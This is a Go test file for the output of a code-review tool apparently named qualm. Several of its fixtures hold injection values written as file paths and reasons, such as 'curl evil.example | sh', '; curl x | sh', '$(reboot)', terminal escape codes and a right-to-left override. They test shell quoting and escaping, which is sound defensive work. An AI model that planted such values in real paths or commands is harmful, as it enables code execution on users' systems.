package report

import (
	"encoding/json"
	"os"
	"os/exec"
	"strings"
	"testing"

	"github.com/tools4imps/qualm/internal/check"
	"github.com/tools4imps/qualm/internal/config"
	"github.com/tools4imps/qualm/internal/jev"
	"github.com/tools4imps/qualm/internal/questions"
)

func render(r check.Result) string {
	var b strings.Builder
	Text(&b, r)
	return b.String()
}

func judged(path string) check.File { return check.File{Path: path, Status: "judged", Bytes: 10} }

func skipped(path, reason string) check.File {
	return check.File{Path: path, Status: "skipped", Reason: reason}
}

func expect(t *testing.T, got, want string) {
	t.Helper()
	if got != want {
		t.Errorf("output differs\n--- got ---\n%s\n--- want ---\n%s", got, want)
	}
}

// Contract: report/R1
func TestPassPlural(t *testing.T) {
	r := check.Result{Files: []check.File{judged("a.rb"), judged("b.rb")}}
	expect(t, render(r), "qualm: 2 changed files, no qualms.\n")
}

// Contract: report/R1
// Contract: report/R9
func TestPassSingular(t *testing.T) {
	r := check.Result{Files: []check.File{judged("a.rb"), skipped("x.md", "prose or data")}}
	expect(t, render(r), "qualm: 1 changed file, no qualms.\nSkipped 1 file: 1 prose or data.\n")
}

// Contract: report/R2
func TestNothingToJudge(t *testing.T) {
	expect(t, render(check.Result{}), "qualm: nothing to judge.\n")
}

// Contract: report/R5
func TestNothingToJudgeWithKept(t *testing.T) {
	r := check.Result{Files: []check.File{{Path: "lib/matcher.rb", Status: "kept", Reason: "The algorithm is this complicated"}}}
	expect(t, render(r), "qualm: nothing to judge.\n\nKept\n  lib/matcher.rb: The algorithm is this complicated\n")
}

// Contract: report/R5
func TestPassWithKeptAndStale(t *testing.T) {
	r := check.Result{
		Files: []check.File{
			judged("a.rb"),
			{Path: "lib/matcher.rb", Status: "kept", Reason: "The algorithm is this complicated"},
		},
		StaleKeeps: []config.Keep{{Path: "lib/old.rb", Reason: "It was fine at the time"}},
	}
	want := "qualm: 1 changed file, no qualms.\n" +
		"\nKept\n  lib/matcher.rb: The algorithm is this complicated\n" +
		"\nStale keeps (qualm keep clears them)\n  lib/old.rb: It was fine at the time\n"
	expect(t, render(r), want)
}

// Contract: report/R5
func TestStaleOnly(t *testing.T) {
	r := check.Result{StaleKeeps: []config.Keep{{Path: "lib/old.rb", Reason: "It was fine at the time"}}}
	expect(t, render(r), "qualm: nothing to judge.\n\nStale keeps (qualm keep clears them)\n  lib/old.rb: It was fine at the time\n")
}

const (
	bigUnit = "Did the change make an already long function or class longer, where the new work could have gone in a unit of its own?"
	copies  = "Did the change add logic that is a near-copy of logic already in the file?"
)

func qs() []questions.Question {
	return []questions.Question{
		{ID: "push_back", Type: "noul", Role: "gate", Gates: true, Threshold: 0.6, Instructions: "Would a reviewer push back?"},
		{ID: "direction", Type: "choice", Role: "describes", Criteria: json.RawMessage(`{"harder":"h","same":"s","easier":"e"}`), Instructions: "How hard?"},
		{ID: "grew_a_big_unit", Type: "noul", Role: "diagnosis", Instructions: bigUnit},
		{ID: "added_copies", Type: "noul", Role: "diagnosis", Instructions: copies},
	}
}

func score(v float64) jev.Answer { return jev.Answer{Value: v} }

func direction(choice string, v float64) jev.Answer { return jev.Answer{Value: v, Choice: choice} }

func failing(path string, answers map[string]jev.Answer, where map[string][2]int) check.File {
	return check.File{Path: path, Status: "judged", Answers: answers, Failed: []string{"push_back"}, Where: where}
}

// Contract: report/R3
// Contract: report/R4
// Contract: report/R8
func TestFailOneFile(t *testing.T) {
	f := failing("lib/mutineer/coverage_map.rb", map[string]jev.Answer{
		"push_back":       score(0.61),
		"direction":       direction("harder", 0.99),
		"grew_a_big_unit": score(0.84),
		"added_copies":    score(0.75),
	}, map[string][2]int{"grew_a_big_unit": {412, 540}, "added_copies": {598, 655}})
	r := check.Result{Questions: qs(), Files: []check.File{f, judged("a.rb"), judged("b.rb"), judged("c.rb"), judged("d.rb"), judged("e.rb"), judged("f.rb")}}
	want := `qualm: 1 of 7 changed files drew a qualm.

lib/mutineer/coverage_map.rb  push back 0.61
  harder 0.99
  grew a big unit 0.84  lines 412-540
  added copies 0.75     lines 598-655

What to do
  A reviewer would likely ask for this change to be simplified before it merges.
  The questions that fired:
    grew_a_big_unit: ` + bigUnit + `
    added_copies: ` + copies + `
  Rework the change so they no longer apply, then run qualm again.
  A qualm is an opinion. If the change is right as it stands, a person can keep it:
    qualm keep lib/mutineer/coverage_map.rb --reason "..."
`
	expect(t, render(r), want)
}

// Contract: report/R3
// Contract: report/R4
func TestFailSeveralFiles(t *testing.T) {
	a := failing("lib/a.rb", map[string]jev.Answer{
		"push_back": score(0.7), "direction": direction("same", 0.9), "added_copies": score(0.55),
	}, nil)
	b := failing("lib/much/longer.rb", map[string]jev.Answer{
		"push_back": score(0.65), "direction": direction("easier", 0.8), "grew_a_big_unit": score(0.9), "added_copies": score(0.4),
	}, map[string][2]int{"grew_a_big_unit": {7, 7}})
	r := check.Result{Questions: qs(), Files: []check.File{a, b, judged("z.rb")}}
	want := `qualm: 2 of 3 changed files drew a qualm.

lib/a.rb            push back 0.70
  added copies 0.55

lib/much/longer.rb  push back 0.65
  easier 0.80
  grew a big unit 0.90  line 7

What to do
  A reviewer would likely ask for these changes to be simplified before they merge.
  The questions that fired:
    grew_a_big_unit: ` + bigUnit + `
    added_copies: ` + copies + `
  Rework the change so they no longer apply, then run qualm again.
  A qualm is an opinion. If the change is right as it stands, a person can keep it:
    qualm keep lib/a.rb lib/much/longer.rb --reason "..."
`
	expect(t, render(r), want)
}

// Contract: report/R3
func TestFailWithoutDiagnosis(t *testing.T) {
	f := failing("lib/a.rb", map[string]jev.Answer{
		"push_back": score(0.8), "direction": direction("same", 0.9), "grew_a_big_unit": score(0.49),
	}, nil)
	r := check.Result{Questions: qs(), Files: []check.File{f}}
	want := `qualm: 1 of 1 changed file drew a qualm.

lib/a.rb  push back 0.80

What to do
  A reviewer would likely ask for this change to be simplified before it merges.
  Simplify the change, then run qualm again.
  A qualm is an opinion. If the change is right as it stands, a person can keep it:
    qualm keep lib/a.rb --reason "..."
`
	expect(t, render(r), want)
}

// Contract: report/R3
func TestDiagnosisWithAndWithoutWhere(t *testing.T) {
	f := failing("a.rb", map[string]jev.Answer{
		"push_back": score(0.8), "grew_a_big_unit": score(0.6), "added_copies": score(0.9),
	}, map[string][2]int{"grew_a_big_unit": {3, 9}})
	r := check.Result{Questions: qs(), Files: []check.File{f}}
	got := render(r)
	want := "  added copies 0.90\n  grew a big unit 0.60  lines 3-9\n"
	if !strings.Contains(got, "\n"+want+"\n") {
		t.Errorf("block lines missing\n%s", got)
	}
}

// Contract: report/R3
func TestEqualDiagnosesKeepQuestionOrder(t *testing.T) {
	f := failing("a.rb", map[string]jev.Answer{
		"push_back": score(0.8), "added_copies": score(0.7), "grew_a_big_unit": score(0.7),
	}, nil)
	r := check.Result{Questions: qs(), Files: []check.File{f}}
	if !strings.Contains(render(r), "\n  grew a big unit 0.70\n  added copies 0.70\n\n") {
		t.Errorf("ties out of order\n%s", render(r))
	}
}

// Contract: report/R3
func TestFailThenKeeps(t *testing.T) {
	f := failing("a.rb", map[string]jev.Answer{"push_back": score(0.8)}, nil)
	r := check.Result{
		Questions:  qs(),
		Files:      []check.File{f, {Path: "k.rb", Status: "kept", Reason: "ok"}},
		StaleKeeps: []config.Keep{{Path: "o.rb", Reason: "old"}},
	}
	want := `qualm: 1 of 1 changed file drew a qualm.

a.rb  push back 0.80

What to do
  A reviewer would likely ask for this change to be simplified before it merges.
  Simplify the change, then run qualm again.
  A qualm is an opinion. If the change is right as it stands, a person can keep it:
    qualm keep a.rb --reason "..."

Kept
  k.rb: ok

Stale keeps (qualm keep clears them)
  o.rb: old
`
	expect(t, render(r), want)
}

// Contract: report/R3
func TestSeveralFailedQuestionsJoined(t *testing.T) {
	q := append(qs(), questions.Question{ID: "too_big", Type: "score", Role: "gate", Gates: true, Threshold: 0.5, Instructions: "x"})
	f := check.File{Path: "a.rb", Status: "judged", Failed: []string{"push_back", "too_big"},
		Answers: map[string]jev.Answer{"push_back": score(0.7), "too_big": score(0.5)}}
	got := render(check.Result{Questions: q, Files: []check.File{f}})
	if !strings.Contains(got, "\na.rb  push back 0.70, too big 0.50\n") {
		t.Errorf("failed questions not joined\n%s", got)
	}
}

// Contract: report/R7
func TestDryRunSeveralFiles(t *testing.T) {
	r := check.Result{DryRun: true, Files: []check.File{
		{Path: "lib/a.rb", Status: "judged", Bytes: 1234},
		{Path: "lib/long/name.rb", Status: "judged", Bytes: 300},
		skipped("x.md", "prose or data"),
	}}
	want := `qualm: dry run, nothing sent.
Skipped 1 file: 1 prose or data.

  lib/a.rb           1234 bytes   about 1411 tokens
  lib/long/name.rb    300 bytes   about 1100 tokens

2 files, about 2511 tokens, about $0.0001.
`
	expect(t, render(r), want)
}

// Contract: report/R7
func TestDryRunOneFile(t *testing.T) {
	r := check.Result{DryRun: true, Files: []check.File{{Path: "a.rb", Status: "judged", Bytes: 3000}}}
	want := "qualm: dry run, nothing sent.\n\n  a.rb   3000 bytes   about 2000 tokens\n\n1 file, about 2000 tokens, about $0.0001.\n"
	expect(t, render(r), want)
}

// Contract: report/R7
func TestDryRunNothingToJudge(t *testing.T) {
	r := check.Result{DryRun: true, Files: []check.File{skipped("x.md", "prose or data")}}
	expect(t, render(r), "qualm: nothing to judge.\nSkipped 1 file: 1 prose or data.\n")
}

// Contract: report/R2
// Contract: report/R9
func TestNothingToJudgeSaysWhatWasSkipped(t *testing.T) {
	r := check.Result{Files: []check.File{
		skipped("a_test.rb", "test"), skipped("x.md", "prose or data"), skipped("b_test.rb", "test"),
		skipped("y.md", "prose or data"), skipped("z.md", "prose or data"), skipped("go.sum", "lockfile or generated"),
		skipped("img.png", "binary"), skipped("gen.rb", "skip rule *"),
	}}
	// The reason that skipped most comes first, and reasons that skipped as many go by name.
	want := "qualm: nothing to judge.\n" +
		"Skipped 8 files: 3 prose or data, 2 test, 1 binary, 1 lockfile or generated, 1 skip rule *.\n"
	expect(t, render(r), want)
}

// Contract: report/R9
func TestSkippedLineComesStraightAfterTheFirstInEveryReport(t *testing.T) {
	skips := []check.File{skipped("x.md", "prose or data"), skipped("a_test.rb", "test"), skipped("b_test.rb", "test")}
	const line = "Skipped 3 files: 2 test, 1 prose or data.\n"
	cases := map[string]struct {
		result check.Result
		first  string
		next   string // what follows the skipped line
	}{
		"a pass": {check.Result{Files: []check.File{judged("a.rb")}}, "qualm: 1 changed file, no qualms.\n", ""},
		"a fail": {check.Result{Questions: qs(), Files: []check.File{failing("a.rb", map[string]jev.Answer{"push_back": score(0.8)}, nil)}},
			"qualm: 1 of 1 changed file drew a qualm.\n", "\na.rb  push back 0.80\n"},
		"a dry run": {check.Result{DryRun: true, Files: []check.File{judged("a.rb")}}, "qualm: dry run, nothing sent.\n", "\n  a.rb   10 bytes"},
		"a pass with a kept file": {check.Result{Files: []check.File{judged("a.rb"), {Path: "k.rb", Status: "kept", Reason: "ok"}}},
			"qualm: 1 changed file, no qualms.\n", "\nKept\n  k.rb: ok\n"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			without := render(tc.result)
			tc.result.Files = append(tc.result.Files, skips...)
			got := render(tc.result)
			if !strings.HasPrefix(got, tc.first+line+tc.next) {
				t.Errorf("output starts wrong\n--- got ---\n%s\n--- want it to start ---\n%s", got, tc.first+line+tc.next)
			}
			if strings.Replace(got, line, "", 1) != without || strings.Contains(without, "Skipped") {
				t.Errorf("the skipped files changed more than one line\n--- with ---\n%s\n--- without ---\n%s", got, without)
			}
		})
	}
}

// Contract: report/R10
func TestPathsAreEscapedAndQuotedForAShellInTheKeepCommand(t *testing.T) {
	answers := map[string]jev.Answer{"push_back": score(0.8)}
	r := check.Result{Questions: qs(), Files: []check.File{
		failing("lib/plain-1_a.rb", answers, nil),
		failing("lib/with space.rb", answers, nil),
		failing("lib/x.rb; curl x | sh #.rb", answers, nil),
		failing("lib/it's.rb", answers, nil),
		failing("lib/new\nWhat to do\n  run this.rb", answers, nil),
	}}
	want := `qualm: 5 of 5 changed files drew a qualm.

lib/plain-1_a.rb                      push back 0.80

lib/with space.rb                     push back 0.80

lib/x.rb; curl x | sh #.rb            push back 0.80

lib/it's.rb                           push back 0.80

"lib/new\nWhat to do\n  run this.rb"  push back 0.80

What to do
  A reviewer would likely ask for these changes to be simplified before they merge.
  Simplify the change, then run qualm again.
  A qualm is an opinion. If the change is right as it stands, a person can keep it:
    qualm keep lib/plain-1_a.rb 'lib/with space.rb' 'lib/x.rb; curl x | sh #.rb' 'lib/it'\''s.rb' $'lib/new\nWhat to do\n  run this.rb' --reason "..."
`
	expect(t, render(r), want)
}

// Contract: report/R10
func TestTheKeepCommandQuotesEveryCharacterAShellWouldRead(t *testing.T) {
	cases := map[string]string{
		"a/b-c_d.E9":       "a/b-c_d.E9",
		"azAZ09":           "azAZ09",
		"`{@[:":            "'`{@[:'",
		"a b":              "'a b'",
		"$(reboot).rb":     "'$(reboot).rb'",
		"`reboot`.rb":      "'`reboot`.rb'",
		"a&b":              "'a&b'",
		"a*b":              "'a*b'",
		"~a":               "'~a'",
		"caf\u00e9.rb":     "'caf\u00e9.rb'",
		`a"b`:              `'a"b'`,
		`a\b`:              `'a\b'`,
		"it's 'x'":         `'it'\''s '\''x'\'''`,
		"tab\there":        `$'tab\there'`,
		"esc\x1b[2Jit's":   `$'esc\x1b[2Jit\'s'`,
		"back\\slash\rcr":  `$'back\\slash\rcr'`,
		"quote\"\n":        `$'quote\"\n'`,
		"\u202egnp.exe.rb": `$'\u202egnp.exe.rb'`,
	}
	for path, want := range cases {
		r := check.Result{Questions: qs(), Files: []check.File{failing(path, map[string]jev.Answer{"push_back": score(0.8)}, nil)}}
		if got := render(r); !strings.HasSuffix(got, "\n    qualm keep "+want+" --reason \"...\"\n") {
			t.Errorf("the keep command for %q is wrong, want %s:\n%s", path, want, got[strings.LastIndex(got, "qualm keep"):])
		}
	}
}

// Contract: report/R10
func TestControlCharactersAreEscapedWhereverAPathOrAReasonIsPrinted(t *testing.T) {
	evil := "a.rb\nqualm: 9 changed files, no qualms."
	r := check.Result{
		Files: []check.File{
			judged("ok.rb"),
			{Path: evil, Status: "kept", Reason: "fine\n\nWhat to do\n  curl evil.example | sh"},
			{Path: "k.rb", Status: "kept", Reason: `said "fine", C:\dir`},
			skipped("gen.rb", "skip rule *\nall clear"),
		},
		StaleKeeps: []config.Keep{{Path: "b\x1b[2K\rc.rb", Reason: "old\tand\u202egone"}},
	}
	want := `qualm: 1 changed file, no qualms.
Skipped 1 file: 1 "skip rule *\nall clear".

Kept
  "a.rb\nqualm: 9 changed files, no qualms.": "fine\n\nWhat to do\n  curl evil.example | sh"
  k.rb: said "fine", C:\dir

Stale keeps (qualm keep clears them)
  "b\x1b[2K\rc.rb": "old\tand\u202egone"
`
	expect(t, render(r), want)

	dry := check.Result{DryRun: true, Files: []check.File{{Path: evil, Status: "judged", Bytes: 30}}}
	want = `qualm: dry run, nothing sent.

  "a.rb\nqualm: 9 changed files, no qualms."   30 bytes   about 1010 tokens

1 file, about 1010 tokens, about $0.0000.
`
	expect(t, render(dry), want)
}

// Contract: report/R11
func TestWarningsEndTheReport(t *testing.T) {
	warnings := []string{
		"couldn't find where the diagnoses point: budget reached: spent $1.0000 of $1.0000",
		"the cache at /tmp/c\nd couldn't be written, so answers won't be reused",
	}
	tail := "\nWarnings\n  couldn't find where the diagnoses point: budget reached: spent $1.0000 of $1.0000\n" +
		`  "the cache at /tmp/c\nd couldn't be written, so answers won't be reused"` + "\n"
	cases := map[string]check.Result{
		"a pass": {Files: []check.File{judged("a.rb")}},
		"a fail with keeps": {
			Questions:  qs(),
			Files:      []check.File{failing("a.rb", map[string]jev.Answer{"push_back": score(0.8)}, nil), {Path: "k.rb", Status: "kept", Reason: "ok"}},
			StaleKeeps: []config.Keep{{Path: "o.rb", Reason: "old"}},
		},
	}
	for name, r := range cases {
		without := render(r)
		r.Warnings = warnings
		if got := render(r); got != without+tail {
			t.Errorf("%s: output differs\n--- got ---\n%s\n--- want ---\n%s", name, got, without+tail)
		}
		if strings.Contains(without, "Warnings") {
			t.Errorf("%s: a run with no warnings has a Warnings section:\n%s", name, without)
		}
	}
}

// Contract: report/R12
func TestAChoiceIsNamedUnlessItDescribesTheChange(t *testing.T) {
	q := append(qs(),
		questions.Question{ID: "risk_level", Type: "choice", Role: "diagnosis", Criteria: json.RawMessage(`{"high":"h","low":"l"}`), Instructions: "How risky?"},
		questions.Question{ID: "kind", Type: "choice", Role: "describes", Criteria: json.RawMessage(`{"feature":"f","same":"s"}`), Instructions: "What kind?"},
		questions.Question{ID: "tone", Type: "choice", Role: "diagnosis", Criteria: json.RawMessage(`{"same":"s","other":"o"}`), Instructions: "What tone?"},
	)
	a := failing("a.rb", map[string]jev.Answer{
		"push_back": score(0.8), "direction": direction("harder", 0.99), "added_copies": score(0.7),
		"risk_level": direction("high", 0.9), "kind": direction("feature", 0.6), "tone": direction("same", 0.55),
	}, nil)
	b := failing("b.rb", map[string]jev.Answer{
		"push_back": score(0.7), "direction": direction("same", 0.9),
		"risk_level": direction("low", 0.51), "kind": direction("same", 0.8), "tone": direction("other", 1),
	}, nil)
	want := `qualm: 2 of 2 changed files drew a qualm.

a.rb  push back 0.80
  harder 0.99
  risk level high 0.90
  feature 0.60
  tone same 0.55
  added copies 0.70

b.rb  push back 0.70
  risk level low 0.51
  tone other 1.00

What to do
  A reviewer would likely ask for these changes to be simplified before they merge.
  The questions that fired:
    added_copies: ` + copies + `
  Rework the change so they no longer apply, then run qualm again.
  A qualm is an opinion. If the change is right as it stands, a person can keep it:
    qualm keep a.rb b.rb --reason "..."
`
	expect(t, render(check.Result{Questions: q, Files: []check.File{a, b}}), want)
}

// Contract: report/R10
func TestAShellReadsTheKeepCommandsPathsBackAsTheyAre(t *testing.T) {
	bash, err := exec.LookPath("bash")
	if err != nil {
		t.Skip("no bash to read the command with")
	}
	paths := []string{
		"lib/plain.rb", "with space.rb", "x.rb; touch pwned #.rb", "it's.rb", "$(touch pwned).rb", "`touch pwned`.rb",
		"a\nb.rb", "tab\there's.rb", "esc\x1b[2J.rb", `back\slash\n.rb`, "quote\".rb", "a\\\nb'c\"d.rb", "*.rb", "-n",
	}
	var files []check.File
	for _, p := range paths {
		files = append(files, failing(p, map[string]jev.Answer{"push_back": score(0.8)}, nil))
	}
	out := render(check.Result{Questions: qs(), Files: files})
	command := out[strings.LastIndex(out, "    qualm keep "):]
	if strings.Count(command, "\n") != 1 {
		t.Fatalf("the keep command is not one line: %q", command)
	}
	// The shell runs the line with a qualm that prints each argument it was given, NUL-ended.
	script := `qualm() { printf '%s\0' "$@"; }` + "\n" + command
	cmd := exec.Command(bash, "-c", script)
	cmd.Dir = t.TempDir()
	got, err := cmd.Output()
	if err != nil {
		t.Fatalf("bash could not run %q: %v", command, err)
	}
	want := "keep\x00" + strings.Join(paths, "\x00") + "\x00--reason\x00...\x00"
	if string(got) != want {
		t.Errorf("bash read %q\nwant %q\nfrom %s", got, want, command)
	}
	if entries, _ := os.ReadDir(cmd.Dir); len(entries) != 0 {
		t.Errorf("running the keep command made %d files, want a path never to run as a command", len(entries))
	}
}
